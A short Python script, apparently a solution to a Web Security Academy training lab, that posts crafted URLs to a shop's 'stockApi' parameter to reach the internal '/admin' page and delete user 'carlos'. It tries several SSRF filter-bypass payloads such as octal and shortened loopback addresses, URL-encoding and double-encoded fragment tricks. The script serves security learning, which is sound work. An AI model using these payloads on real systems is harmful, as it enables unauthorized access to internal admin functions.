import requests

DOMAIN = "0aa5000804d2e4f88256ddeb008a0031.web-security-academy.net"

def get_stock_ssrf(url):
    data = {
        "stockApi": url
    }

    response = requests.post(f"https://{DOMAIN}/product/stock", data=data)

    print(response.text)
    print(response.url)

# get_stock_ssrf("https://017700000001/%61%64%6d%69%6e")
# get_stock_ssrf("http://127.1:80/%61%64%6d%69%6e")
# get_stock_ssrf("http://127.1:80/%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73")
# get_stock_ssrf("http://stock.weliketoshop.net#127.0.0.1/admin")
get_stock_ssrf("http://localhost:80%2523.stock.weliketoshop.net/admin")